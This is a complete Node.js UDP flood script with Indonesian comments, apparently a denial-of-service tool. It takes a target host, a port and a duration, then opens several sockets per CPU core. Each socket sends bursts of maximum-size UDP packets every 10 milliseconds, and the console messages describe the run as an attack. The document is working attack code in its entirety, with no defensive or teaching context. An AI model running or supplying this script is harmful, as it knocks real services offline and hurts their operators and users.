const dgram = require('dgram');
const os = require('os');
const target = process.argv[2];
const port = process.argv[3];
const duration = parseInt(process.argv[4]);

function generatePayload(size) {
    let payload = Buffer.alloc(size);
    payload.fill('PermenMD');
    return payload;
}

const payloadSize = 65507; // Ukuran payload maksimum untuk UDP
const payload = generatePayload(payloadSize);
const numSockets = os.cpus().length * 2; // Memakai multiple socket berdasarkan jumlah CPU * 2

let sockets = [];

// Membuat multiple socket untuk parallelism
for (let i = 0; i < numSockets; i++) {
    sockets.push(dgram.createSocket('udp4'));
}

console.clear();
console.log(`Memulai serangan ke ${target}:${port} selama ${duration} detik...`);

const interval = setInterval(() => {
    for (const socket of sockets) {
        for (let i = 0; i < 100; i++) { // Mengirim lebih banyak paket per iterasi
            socket.send(payload, 0, payload.length, port, target, (err) => {
                if (err) console.error('Error:', err.message);
            });
        }
    }
}, 10); // Interval cepat untuk memaksimalkan kecepatan pengiriman paket

setTimeout(() => {
    clearInterval(interval);
    sockets.forEach(socket => socket.close());
    console.log('Serangan dihentikan.');
    process.exit(0);
}, duration * 1000);
